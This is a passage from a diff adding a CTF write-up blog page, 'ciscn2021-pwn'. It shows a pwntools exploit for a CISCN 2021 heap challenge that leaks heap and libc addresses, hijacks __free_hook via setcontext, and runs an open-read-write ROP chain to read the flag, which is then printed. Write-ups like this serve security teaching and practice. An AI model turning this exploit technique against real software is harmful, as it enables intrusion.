+</span></span><span class="line"><span class="cl">    <span class="n">add</span><span class="p">(</span><span class="mh">0x58</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">delete</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">edit</span><span class="p">(</span><span class="s1">&#39;8&#39;</span><span class="o">*</span><span class="mi">9</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">delete</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">show</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;Content: &#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">heap_base</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">*</span><span class="mi">2</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x1880</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">heap_base</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># gdb.attach(p)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">edit</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">add</span><span class="p">(</span><span class="mh">0x58</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">add</span><span class="p">(</span><span class="mh">0x58</span><span class="p">)</span> <span class="c1"># ub</span>
+</span></span><span class="line"><span class="cl">    <span class="n">edit</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\x07</span><span class="s1">&#39;</span><span class="o">*</span><span class="mh">0x30</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">delete</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">show</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;Content: &#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">libcbase</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">*</span><span class="mi">2</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x3ebca0</span>
+</span></span><span class="line"><span class="cl">    <span class="n">free_hook</span> <span class="o">=</span> <span class="n">libcbase</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;__free_hook&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="n">write_addr</span> <span class="o">=</span> <span class="n">libcbase</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="n">setcontext</span> <span class="o">=</span> <span class="n">libcbase</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;setcontext&#39;</span><span class="p">]</span><span class="o">+</span><span class="mi">53</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">libcbase</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0x215bf</span> <span class="o">+</span> <span class="n">libcbase</span>
+</span></span><span class="line"><span class="cl">    <span class="n">pop_rsi</span> <span class="o">=</span> <span class="mh">0x23eea</span> <span class="o">+</span> <span class="n">libcbase</span>
+</span></span><span class="line"><span class="cl">    <span class="n">pop_rax</span> <span class="o">=</span> <span class="mh">0x43ae8</span> <span class="o">+</span> <span class="n">libcbase</span>
+</span></span><span class="line"><span class="cl">    <span class="n">pop_rdx</span> <span class="o">=</span> <span class="mh">0x01b96</span> <span class="o">+</span> <span class="n">libcbase</span>
+</span></span><span class="line"><span class="cl">    <span class="n">pop_rsp</span> <span class="o">=</span> <span class="mh">0x03960</span> <span class="o">+</span> <span class="n">libcbase</span>
+</span></span><span class="line"><span class="cl">    <span class="n">read_call</span> <span class="o">=</span> <span class="mh">0x110140</span> <span class="o">+</span> <span class="n">libcbase</span>
+</span></span><span class="line"><span class="cl">    <span class="n">syscall_ret</span> <span class="o">=</span> <span class="mh">0xd2745</span> <span class="o">+</span> <span class="n">libcbase</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="se">\x01\x00\x00\x00\x00\x07\x07</span><span class="s1">&#39;</span><span class="o">+</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">*</span><span class="p">(</span><span class="mi">64</span> <span class="o">-</span> <span class="mi">7</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">free_hook</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span>
+</span></span><span class="line"><span class="cl">    <span class="n">edit</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">   
+</span></span><span class="line"><span class="cl">    <span class="n">add</span><span class="p">(</span><span class="mh">0x10</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">edit</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">setcontext</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="n">add</span><span class="p">(</span><span class="mh">0x68</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">add</span><span class="p">(</span><span class="mh">0x68</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">add</span><span class="p">(</span><span class="mh">0x68</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">edit</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span><span class="o">+</span><span class="mh">0x1210</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">add</span><span class="p">(</span><span class="mh">0x78</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">add</span><span class="p">(</span><span class="mh">0x78</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">payload</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="n">read_call</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rdx</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x30</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">write_addr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">edit</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">add</span><span class="p">(</span><span class="mh">0x78</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">flag</span> <span class="o">=</span> <span class="n">heap_base</span><span class="o">+</span><span class="mh">0x1210</span><span class="o">+</span><span class="mi">8</span><span class="o">+</span><span class="mh">0x60</span>
+</span></span><span class="line"><span class="cl">    <span class="n">orw</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">orw</span><span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rax</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">syscall_ret</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">orw</span><span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rdx</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x30</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="n">orw</span><span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rsp</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span><span class="o">+</span><span class="mh">0x1210</span><span class="o">-</span><span class="mh">0xa0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">edit</span><span class="p">(</span><span class="n">orw</span><span class="o">+</span><span class="s2">&#34;./flag</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">#gdb.attach(p)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">delete</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>flag = CISCN{NEqT9-o7fw0-qYWHr-uPwKk-qJj0T-}</p>
+</div>
+
+        <div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2021-05-26</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span><a class="link-to-mardown" href=/ciscn2021-pwn/index.md target="_blank" rel="noopener noreferrer">阅读原始文档</a>
+                    </span></div>
+            <div class="post-info-share">
+                <span></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/writeups/">Writeups</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/challenges-100-week-10/" class="prev" rel="prev" title="Challenges 100 Week 10"><i class="fas fa-angle-left fa-fw"></i>Challenges 100 Week 10</a>
+            <a href="/2021dasxbuuctf-may/" class="next" rel="next" title="2021DASxBUUCTF May">2021DASxBUUCTF May<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+</article></div>
+        </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2020 - 2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank" rel="noopener noreferrer">Niebelungen</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+            <div class="footer-line"></div>
+            <div class="footer-line">
+            </div>
+        </div></footer></div>
+
+    <div id="fixed-buttons"><a href="#back-to-top" id="back-to-top-button" class="fixed-button" title="回到顶部">
+            <i class="fas fa-arrow-up fa-fw"></i>
+        </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+            <i class="fas fa-comment fa-fw"></i>
+        </a>
+    </div><div id="cookieconsent-container"></div><div class="assets"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/fuse/fuse.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/tablesort/tablesort.min.js"></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script type="text/javascript" src="/lib/topbar/topbar.min.js"></script><script type="text/javascript" src="/lib/pjax/pjax.min.js"></script><script type="text/javascript" src="/js/theme.min.js" defer></script></div>
+
+<div class="pjax-assets"><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":100},"comment":{},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"distance":100,"findAllMatches":false,"fuseIndexURL":"/index.json","highlightTag":"em","ignoreFieldNorm":false,"ignoreLocation":false,"isCaseSensitive":false,"location":0,"maxResultLength":10,"minMatchCharLength":2,"noResultsFound":"没有找到结果","snippetLength":50,"threshold":0.3,"type":"fuse","useExtendedSearch":false},"table":{"sort":true}};</script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js" defer></script><script type="text/javascript" src="/lib/katex/auto-render.min.js" defer></script><script type="text/javascript" src="/lib/katex/copy-tex.min.js" defer></script><script type="text/javascript" src="/lib/katex/mhchem.min.js" defer></script><script type="text/javascript" src="/js/katex.min.js" defer></script><script type="text/javascript" src="/js/cookieconsent.min.js" defer></script><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/katex/copy-tex.min.css">
+        <noscript><link rel="stylesheet" href="/lib/katex/copy-tex.min.css"></noscript></div>
+</body>
+
+</html>
